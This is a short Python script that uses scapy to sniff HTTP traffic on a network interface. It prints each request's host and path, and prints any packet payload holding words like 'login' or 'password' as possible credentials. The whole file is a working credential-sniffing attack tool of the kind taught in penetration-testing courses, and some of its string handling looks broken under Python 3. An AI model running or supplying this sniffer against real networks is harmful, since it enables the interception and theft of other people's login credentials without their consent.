import scapy.all as scapy
import argparse
import scapy_http as http

#get arguments for interface, etc.
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface",
                        help="Interface name")
    options = parser.parse_args()
    return options

#define sniff method via scapy.sniff
def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

#get packet url
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

#check for http-packets
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url)
        credentials = get_credentials(packet)
        if credentials:
            print("[+] Possible username/passowrd" + credentials + "\n\n")

#get login credentials
def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "password", "username", "user", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

args = get_arguments()
sniff_packet(args.interface)
